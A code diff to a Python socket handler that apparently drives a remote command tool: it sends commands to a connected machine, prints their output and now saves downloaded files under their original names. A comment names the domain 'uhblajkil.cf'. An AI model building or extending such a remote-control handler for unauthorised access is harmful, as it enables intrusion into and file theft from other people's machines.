@@ -34,11 +34,13 @@ class Socket:
         if "-batch" in command.decode() or "cd.." in command.decode() or "cd" in command.decode():
             return
         if "-download" in command.decode():
-            self.receive_command_output(download=True)
+            name, ending = command.decode().split(".")
+            name = name.replace("-download ", "")
+            self.receive_command_output(download=True, file_ending=ending, file_name=name)
             return
         self.receive_command_output()
 
-    def receive_command_output(self, download=False):
+    def receive_command_output(self, download=False, file_ending="", file_name=""):
         full_msg = b''
         new_msg = True
         while True:
@@ -58,7 +60,7 @@ class Socket:
                     print(full_msg)
                 else:
                     full_msg = full_msg[self.header:]
-                    new_file = open("new_file.exe", "wb+")
+                    new_file = open(file_name + "." + file_ending, "wb+")
                     new_file.write(full_msg)
                     new_file.close()
                 return True
@@ -80,7 +82,6 @@ while True:
 
 
 # uhblajkil.cf
-# Endung von runtergeadener Datei
 
 
 
